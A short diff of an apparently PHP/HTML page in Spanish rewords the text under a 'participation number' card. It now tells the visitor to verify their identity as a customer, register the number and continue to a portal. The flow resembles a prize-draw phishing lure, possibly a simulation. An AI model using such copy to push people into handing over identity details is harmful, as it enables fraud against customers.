@@ -793,12 +793,12 @@ $v = time();
         <div class="ticket-card">
           <div class="ticket-label">Tu número de participación</div>
           <div class="ticket-number" id="ticketNumber">— — — —</div>
-          <div class="ticket-foot">Guarda este número para futuras consultas</div>
+          <div class="ticket-foot">Guarda este número y regístralo para participar</div>
         </div>
 
         <div class="next-step">
           <span class="next-icon">🔐</span>
-          <p>Para finalizar tu participación, verifica tu identidad como cliente.</p>
+          <p>Para finalizar, verifica tu identidad como cliente y registra tu número de participación.</p>
         </div>
 
         <button type="button" class="sim-btn" onclick="continueToPortal()">Verificarme y finalizar</button>
